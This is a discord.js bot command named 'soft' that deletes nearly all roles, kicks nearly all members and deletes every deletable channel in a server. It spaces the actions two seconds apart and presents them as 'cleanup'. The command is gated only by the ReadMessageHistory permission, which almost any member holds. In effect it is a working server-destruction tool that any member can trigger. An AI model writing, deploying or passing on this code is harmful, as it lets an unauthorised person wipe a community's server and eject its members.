const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');

const wait = ms => new Promise(res => setTimeout(res, ms));

module.exports = {
    data: new SlashCommandBuilder()
        .setName('soft')
        .setDescription('Deletes channels, roles, kicks users')
        .setDefaultMemberPermissions(PermissionFlagsBits.ReadMessageHistory),

    async execute(interaction) {
        if (!interaction.member.permissions.has(PermissionFlagsBits.ReadMessageHistory)) {
            return interaction.reply({ content: 'You do not have permission.', ephemeral: true });
        }
        
        await interaction.reply('**Starting cleanup...**');
        
        // Delete all roles
        const botId = interaction.client.user.id;
        const issuerId = interaction.user.id;
        const roles = await interaction.guild.roles.fetch();

        for (const [id, role] of roles) {
             if (!role.editable) {
                continue;
            }

            // CHECK 2: Does the BOT have this role? (Protect Bot)
            if (role.members.has(botId)) {
                console.log(`Skipping (Bot Role): ${role.name}`);
                continue;
            }

            // CHECK 3: Does the COMMAND ISSUER have this role? (Protect You)
            if (role.members.has(issuerId)) {
                console.log(`Skipping (Issuer Role): ${role.name}`);
                continue;
            }
            try {
                console.log(`Deleting role: ${role.name}`);
                await role.delete();
                await wait(2000); // two second wait
            } catch (error) {
                console.error(`Could not delete role ${role.name}`);
            }
        }

        // Kick all members
        const members = await interaction.guild.members.fetch();
        const ownerId = interaction.guild.ownerId;

        for (const [id, member] of members) {
            if (id === botId) continue;
            if (id === interaction.user.id) continue;
            if (id === ownerId) continue;
            if (!member.kickable) continue;

            try {
                console.log(`Kicking user: ${member.user.username}`);
                await member.kick(`Cleanup`);
                await wait(2000);
            } catch (error) {
                console.error(`Failed to kick ${member.user.username}`);
            }
        }

        // Delete all channels, except the current one
        const channels = await interaction.guild.channels.fetch();
        const currentChannelId = interaction.channelId;

        for (const [id, channel] of channels) {
            if (!channel.deletable) continue;
            if (id === interaction.channelId) continue;
            try {
                console.log(`Deleting channel: ${channel.name} (${id})`);
                await channel.delete();
                await wait(2000); // 2 second wait
            } catch (error) {
                console.error(`Failed to delete channel ${id}:`, error);
            }
        }


        // Delete current channel last
        const currentChannel = channels.get(currentChannelId);
        if (currentChannel && currentChannel.deletable) {
            console.log(`Deleting final channel: ${currentChannel.name}`);
            await currentChannel.delete().catch(console.error);
        }

    },
};